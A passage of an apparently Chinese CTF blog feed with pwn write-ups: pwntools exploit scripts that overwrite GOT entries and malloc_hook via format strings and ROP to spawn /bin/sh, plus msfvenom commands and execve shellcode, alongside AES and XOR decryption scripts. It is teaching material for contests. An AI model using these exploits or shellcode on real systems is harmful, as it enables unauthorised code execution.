class="string">"Exit\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x2</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sd(<span class="string">"\n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(p64(system_addr))</div><div class="line"><span class="comment"># exec /bin/sh</span></div><div class="line">sd(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h3 id="第三个漏洞"><a href="#第三个漏洞" class="headerlink" title="第三个漏洞"></a>第三个漏洞</h3><p>第三个漏洞非常简单，字符串数组空间大小为0x20，然而却给它赋于了0x28的大小用户输入，导致其溢出覆盖了下一个指针，从而引发任意地址写的利用，我们可以利用任意地址写，将atoi改成printf来泄漏system地址，然后将atoi改成system实现任意代码执行,exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-17 09:43:44</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line"></div><div class="line"><span class="comment"># change atoi to printf</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"y"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line">payload = p64(elf.symbols[<span class="string">"printf"</span>])+<span class="string">"\n"</span></div><div class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>)</div><div class="line">payload +=p64(elf.got[<span class="string">"atoi"</span>])</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line"></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">5</span>)</div><div class="line">ru(<span class="string">"y/n)\n"</span>)</div><div class="line">sl(<span class="string">"y"</span>)</div><div class="line">ru(<span class="string">"nd up with '\\n')\n"</span>)</div><div class="line"></div><div class="line">payload = p64(system_addr)+<span class="string">"\n"</span></div><div class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>)</div><div class="line">payload +=p64(elf.got[<span class="string">"atoi"</span>])</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># \n</span></div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;将atoi_got修改成printf_plt，威力无穷~&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;线下赛只有一个pwn题，但这一个pwn题却出的非常好，虽然防御机制没有全开，但是考察点非常之多，就其中一个漏洞的利用，就考察了如下五个知识点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;string overflow&lt;/li&gt;
&lt;li&gt;int overflow&lt;/li&gt;
&lt;li&gt;off by one&lt;/li&gt;
&lt;li&gt;race condition&lt;/li&gt;
&lt;li&gt;heap overlay &lt;/li&gt;
&lt;li&gt;fmt&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="awd" scheme="https://winter3un.github.io/tags/awd/"/>
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>8月9日个人赛总结 &amp;&amp; writeup</title>
    <link href="https://winter3un.github.io/2017/08/10/2017-8-9/"/>
    <id>https://winter3un.github.io/2017/08/10/2017-8-9/</id>
    <published>2017-08-10T09:20:04.000Z</published>
    <updated>2018-06-15T08:42:10.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>还好这次比赛网络环境比较差，主办方被迫放了许多离线题，让我这只bin dog有机可乘（手动滑稽），但这次比赛也确实发现自身的web能力有限，对于一些简单的web题竟然出现无从下手的情况。。也借这次比赛总结下离线环境下一些特殊操作吧。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>对于一些密码类的题目，手头有合适的工具最好了，但很多情况下，工具并不适用，比如这次比赛中，出现的aes解密，不清楚加密模式，需要输入iv和key，而手头的工具只可以输入key，且加密模式确定，没办法，只能去找库，不过比较幸运的是，之前安装过一个crypt的python库，看里面的源码，竟然有aes加密的说明，简单的倒推一下就能够推出解密脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line">key = <span class="string">b'EaRncVfLgIPMaygA'</span></div><div class="line">iv = <span class="string">b'HDkMsMEzkkzyQLTH'</span></div><div class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</div><div class="line">msg = iv + base64.b64decode(<span class="string">"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg="</span>)</div><div class="line">cipher.decrypt(msg)</div></pre></td></tr></table></figure><p>对于zip压缩包，还是archpr好用。。</p><p>对于web弱口令还需要准备一本字典，其实早就应该准备了，包括一些bypass waf的字典，网站扫描的字典，经过这次比赛，发现对于web题而言，字典是多么重要。</p><p>对于线下赛，webshellkill是一款好工具，可以直接利用其来找容易发现的一句话后门。（不过自己也需要写一个利用命令执行自动种马的脚本）</p><p>rasctftools没有共模攻击的利用方式（这次比赛吃亏了！应该还有它没有的其他攻击方式）</p><p>线下赛的web waf需要完善。</p><p>新的pyc加密方式  <code>stegosaurus</code></p><p>writeup 如下<br><a id="more"></a></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>打开文件。。发现又要压缩密码。。。ORZ</p><p>linux/x86下一段汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">xor %eax, %eax</div><div class="line">xor %ebx, %ebx</div><div class="line">xor %ecx, %ecx</div><div class="line">push %ecx</div><div class="line">push $0x68732f2f</div><div class="line">push $0x6e69622f</div><div class="line">movl %esp,%ebx</div><div class="line">movb $11,%al</div><div class="line">int $0x80</div></pre></td></tr></table></figure></p><p>请将其提取为可用的shellcode,形式如\x01\x2d\x……的代码(字母小写)，shellcode的小写MD5<br>值为解压密码，上用pwntools的asm函数，将这些操作指令反汇编成机器码，如下</p><p><code>\x31\xc0\x31\xdb\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</code></p><p>然后再用题目提供的md5计算器计算下md5即可。</p><p><code>68f3e981152d37d372d732d0c3ee3977</code></p><p>接着常规套路，IDA打开分析一波，等等？？这pwn文件怎么那么熟悉= =。。  这不是全国大学生信安赛pwn3么，原题。。。虽然当时没做出来，但是后来看着别人的writeup复现了，exp还在本地，但是执行的时候，没有拿到shell，再看了下pwn文件，发现很多地址都有变动。</p><p>变动的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">stack_povit = 0x00000000004b93f8</div><div class="line">pop_rdi_ret = 0x00000000004005d5</div><div class="line">fake_fsp = 0x06CCC10</div><div class="line">malloc_hook = 0x6CB788</div><div class="line">read_buf = 0x400AEE</div></pre></td></tr></table></figure><p>具体的思路的话，还是利用格式化字符串的漏洞，修改malloc_hook的数据，让其在接受比较大的参数数据的时候执行malloc，比如”%100000c”,我们便可以控制执行流了。但是这边是静态编译，也不能狗利用one_gadget，很绝望，然而我们可以构造裸的rop来调用syscall（hhhhh），首先得找一个stack_povit，使我们的栈空间得到迁移，在这迁移的栈空间上构造我们的rop，然后触发ret，执行我们的rop，就拿到shell啦，下面是exp。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="comment"># import roputils,os,time</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./pwn1"</span></div><div class="line">remote_ip = <span class="string">"172.16.2.10"</span></div><div class="line">port = <span class="number">20000</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line"><span class="comment"># elf = ELF(target)</span></div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400B69\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line">stack_povit = <span class="number">0x00000000004b93f8</span></div><div class="line">pop_rdi_ret = <span class="number">0x00000000004005d5</span></div><div class="line">fake_fsp = <span class="number">0x06CCC10</span></div><div class="line">malloc_hook = <span class="number">0x6CB788</span></div><div class="line">read_buf = <span class="number">0x400AEE</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># payload = 'A'*8+"%6$n\0"</span></div><div class="line">l = []</div><div class="line">l.append((stack_povit ) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((stack_povit &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((pop_rdi_ret) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((pop_rdi_ret &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((fake_fsp) &amp; <span class="number">0xffff</span>)</div><div class="line">l.append((fake_fsp &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((read_buf) &amp; <span class="number">0xffff</span>)</div><div class="line">l.append((read_buf &gt;&gt; <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>)</div><div class="line"></div><div class="line">payload = <span class="string">""</span></div><div class="line">delta = <span class="number">0</span></div><div class="line">printed = <span class="number">0</span></div><div class="line">index = <span class="number">6</span> + <span class="number">14</span> <span class="comment"># target addr</span></div><div class="line"><span class="keyword">for</span> data <span class="keyword">in</span> l:</div><div class="line">delta = (data-printed)&amp;<span class="number">0xffff</span></div><div class="line">payload +=  <span class="string">'%'</span>+str(delta)+<span class="string">'c'</span>+<span class="string">'%'</span>+str(index)+<span class="string">'$hn'</span></div><div class="line">printed += delta</div><div class="line">index += <span class="number">1</span></div><div class="line"><span class="comment"># payload+=(len(payload)%8)*'A'</span></div><div class="line">payload +=<span class="string">"%"</span>+str(fake_fsp<span class="number">-0x20</span>)+<span class="string">"s"</span></div><div class="line">payload = payload.ljust(<span class="number">14</span>*<span class="number">8</span>,<span class="string">'a'</span>)</div><div class="line"></div><div class="line"><span class="comment"># target addr</span></div><div class="line">payload += p64(malloc_hook)</div><div class="line">payload += p64(malloc_hook+<span class="number">2</span>)</div><div class="line">payload += p64(fake_fsp)</div><div class="line">payload += p64(fake_fsp+<span class="number">2</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">8</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0xa</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0x10</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0x12</span>)</div><div class="line"></div><div class="line"></div><div class="line">sl(payload)</div><div class="line"></div><div class="line">pop_rdi_ret = <span class="number">0x00000000004005d5</span></div><div class="line">pop_rdx_rsi_ret = <span class="number">0x0000000000442a99</span></div><div class="line">pop_rax_rdx_rbx_ret = <span class="number">0x0000000000479836</span></div><div class="line">syscall = <span class="number">0x4004ce</span></div><div class="line">rop = <span class="string">"aaaa\x17"</span></div><div class="line">rop += p64(pop_rdi_ret)+p64(fake_fsp+<span class="number">0x50</span>+<span class="number">0x18</span>)</div><div class="line">rop += p64(pop_rdx_rsi_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">rop += p64(pop_rax_rdx_rbx_ret)+p64(<span class="number">0x3b</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">rop += p64(syscall)</div><div class="line">rop += <span class="string">"/bin/sh\x00"</span></div><div class="line">rop += <span class="string">"/bin/sh\x00"</span></div><div class="line"></div><div class="line"></div><div class="line">sl(rop)</div><div class="line"><span class="comment"># payload = "%6$hn"</span></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div><div class="line"><span class="comment"># flag&#123;9d3db853efce91066f22f1bc09aea6&#125;</span></div></pre></td></tr></table></figure><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>看了加密脚本。。可以直接写出解密脚本，流程基本上没有变化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">s = f.read()</div><div class="line">p = b64decode(s)</div><div class="line"></div><div class="line"></div><div class="line">blocks = unpack(<span class="string">'I'</span> * (len(p) / <span class="number">4</span>), p)</div><div class="line">result = [block ^ block &gt;&gt; <span class="number">16</span> <span class="keyword">for</span> block <span class="keyword">in</span> blocks]</div><div class="line">ciphertext = (<span class="string">''</span>.join(pack(<span class="string">'I'</span>,block) <span class="keyword">for</span> block <span class="keyword">in</span> result))</div><div class="line"></div><div class="line"><span class="keyword">print</span> ciphertext[::<span class="number">-1</span>]</div></pre></td></tr></table></figure><h3 id="moudle"><a href="#moudle" class="headerlink" 